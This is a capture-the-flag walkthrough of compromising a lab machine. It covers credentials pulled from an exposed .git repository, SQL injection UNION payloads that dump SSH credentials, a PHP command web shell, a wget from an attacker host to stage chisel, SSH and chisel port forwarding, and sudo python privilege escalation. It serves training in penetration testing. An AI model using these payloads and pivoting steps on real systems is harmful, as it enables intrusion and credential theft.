______________
- In this _**CTF**_ we find an exposed _**GitHub**_ repository:

<img width="2520" height="857" alt="Captura de pantalla 2026-02-19 195701" src="https://github.com/user-attachments/assets/d18fb0e5-0877-4b41-a44a-f3c1893c81dd" />

```
http://192.168.1.35/.git/
```

- For a deeper analysis, we can download the repository directly to our machine:

```
wget -r http://192.168.1.30/.git/
```

- Once downloaded, we start inspecting it using basic Git commands:

```
git log
```
    Shows the commit history of the repository  



```
`git show 'last_commit'`
```
    Displays detailed changes for a specific commit  

- The idea here is to go commit by commit and look for anything sensitive (credentials, tokens, emails, etc.)

<img width="2135" height="855" alt="Captura de pantalla 2026-02-20 172534" src="https://github.com/user-attachments/assets/90b88916-9bd5-4e55-a568-a82f755bd7f9" />

- In this case, we find a **password and an email**, so we try those credentials.

<img width="3172" height="1442" alt="Captura de pantalla 2026-02-20 172452" src="https://github.com/user-attachments/assets/151ee13b-1ad7-4111-ad76-418e6dc9c46e" />
The credentials worked, and we gain access to this section.

- While exploring the application, we notice it's vulnerable to _**SQL Injection**_:

```
http://192.168.1.15/dashboard.php?id=-1%27%20union%20select%201,group_concat(schema_name),3,4,5,6%20from%20information_schema.schemata--%20-
```

```
mysql,information_schema,performance_schema,sys,darkhole_2
```

 Here we enumerate the databases. Now we go deeper to extract more sensitive data.

```
http://192.168.1.15/dashboard.php?id=-1%27%20union%20select%201,group_concat(user,':',pass),3,4,5,6%20from%20darkhole_2.ssh--%20-
```

 With this injection, we retrieve SSH credentials.

<img width="2352" height="687" alt="Captura de pantalla 2026-02-20 182146" src="https://github.com/user-attachments/assets/91850bed-a40d-4a01-aa83-ccd77927e900" />

<img width="1940" height="1220" alt="Captura de pantalla 2026-02-20 181950" src="https://github.com/user-attachments/assets/d643f28b-f386-4996-bbe0-9b0805c039ac" />
And we successfully log in!

- After some time searching for sensitive files or even **SUID binaries** without success, we move to a deeper analysis of the internal network. Since we already have access to the victim machine, we use:

```
netstat -nat
```

 This shows **active TCP connections** on the system.

<img width="3350" height="1199" alt="Captura de pantalla 2026-02-20 201103" src="https://github.com/user-attachments/assets/5ddf24cd-b319-4dd4-ae65-884bea5c96e4" />
We notice a suspicious port: 9999. Now we analyze the processes using:

```
ps -faux
```

- We discover that a **PHP built-in server (`php -S`)** is running and serving content from:

```
/opt/web/
```

- Inside that directory, we find a file executing a **web shell**, which we can abuse to escalate privileges since the system trusts us as the user **jehad**:

```
<?php  
echo "Parameter GET['cmd']";  
if(isset($_GET['cmd'])){  
echo system($_GET['cmd']);  
}
```

<img width="1530" height="154" alt="Captura de pantalla 2026-02-20 202607" src="https://github.com/user-attachments/assets/5587693c-484f-4b95-81e5-07c8028091c2" />
Testing it confirms it works correctly.

- With this in mind, we move to **port forwarding** to access that internal service.
#### First method: SSH Local Port Forwarding

```
ssh jehad@192.168.1.15 -L 9999:127.0.0.1:9999
```

- Here we establish a **local port forwarding (LPF)** from our attacker machine.  
    This means that accessing:

```
localhost:9999
```

- From our machine will forward the traffic to **port 9999 on the victim**.

<img width="2245" height="592" alt="Captura de pantalla 2026-02-20 222044" src="https://github.com/user-attachments/assets/a67d7f3d-d658-4882-b289-ac0f1032febb" />
As we can see, it works exactly as expected, allowing us to interact with the internal web shell.

- At this point, we just need to get a proper **reverse shell**, stabilize it, and proceed with privilege escalation.

- Once inside with our shell, we continue escalating privileges. Even though we now have more privileges than before, we are still not **root**.

- Checking `.bash_history`, we notice the user previously exposed their password. Then we verify privileges:

```
sudo -l
```

<img width="1335" height="332" alt="Captura de pantalla 2026-02-20 223813" src="https://github.com/user-attachments/assets/79b66f00-e7d2-4fe7-ac3d-a55eb2dbd568" />

<img width="2520" height="382" alt="Captura de pantalla 2026-02-20 224453" src="https://github.com/user-attachments/assets/2f37d0cf-cbe9-456c-a98d-f087f2d7c86f" />
We see that the user can execute python3, which is a clear privilege escalation vector.

<img width="1907" height="752" alt="Captura de pantalla 2026-02-20 225539" src="https://github.com/user-attachments/assets/7cfcf549-a1bd-42f0-adff-b048f0a1b0fb" />

- The command

```
sudo -u
```

 Allows executing commands as another user (in this case, **root**).

<img width="915" height="280" alt="Captura de pantalla 2026-02-20 225612" src="https://github.com/user-attachments/assets/5e0e8bf3-4387-4328-97cf-d892977e37be" />

And there we get the **flag**!

---

#### Second method: Chisel (Remote Port Forwarding)

- First, we download **chisel**:

[https://github.com/jpillora/chisel/releases/tag/v1.11.3](https://github.com/jpillora/chisel/releases/tag/v1.11.3)

<img width="2315" height="789" alt="Pasted image 20260221131335" src="https://github.com/user-attachments/assets/c8236021-a571-47e2-8f9f-ff99876e25bc" />

- Then we move it to our working directory, decompress it with **gunzip**, and assign execution permissions:

```
chmod +x chisel
```

- This method requires **chisel on both attacker and victim**, so we transfer it using a simple HTTP server:

```
python3 -m http.server 80
```

- Then download it on the victim using:

```
wget http://ATTACKER_IP/chisel
```

<img width="3220" height="1190" alt="Captura de pantalla 2026-02-21 133634" src="https://github.com/user-attachments/assets/0b0e1060-cc1b-4ffa-878b-8eee58c54530" />

- After downloading, we give execution permissions on the victim and run it:

<img width="2410" height="1022" alt="Captura de pantalla 2026-02-21 134834" src="https://github.com/user-attachments/assets/3080b2d6-66db-4ea3-86b7-680b34966217" />

```
./chisel client 192.168.1.203:1234 R:9999:127.0.0.1:9999
```

- Here we are using **remote port forwarding (RPF)**:

    R:9999 → victim port  
    :9999 → attacker port

<img width="1940" height="655" alt="Captura de pantalla 2026-02-21 150724" src="https://github.com/user-attachments/assets/18674ae3-f6a3-421c-ab8e-077dc5e6b168" />

We now have a successful connection. From here, we repeat the same idea: get a reverse shell and escalate privileges.
### Key points

### 1
Understanding how to navigate repositories is key. Commands like:

```
git log
git show
```

can reveal sensitive information such as credentials or internal changes.
### 2
Internal network enumeration is extremely valuable during audits. Using:

```
netstat -nat
```

helps identify **active TCP connections**, which can reveal hidden services like in this case.  Combined with:

```
ps -faux
```

we can map processes to ports and identify attack vectors.
### 3
Understanding **port forwarding / pivoting** is critical.

- **Remote Port Forwarding (RPF)**  
    The victim exposes its internal port to the attacker.
    
- **Local Port Forwarding (LPF)**  
    The attacker maps a local port to a port on the victim.
    
- Tools like **ssh** and **chisel** are essential for this.

This technique is extremely powerful because it allows access to **internal services not exposed to the internet**, effectively bypassing firewalls and network restrictions.

> Pivoting is critical in real-world pentesting because it allows attackers to reach internal services (databases, admin panels) that are assumed to be secure.

### 4
When gaining access via **Python**, using modules like **os** allows interaction with the operating system, which is key to upgrading access into a fully interactive **shell**.
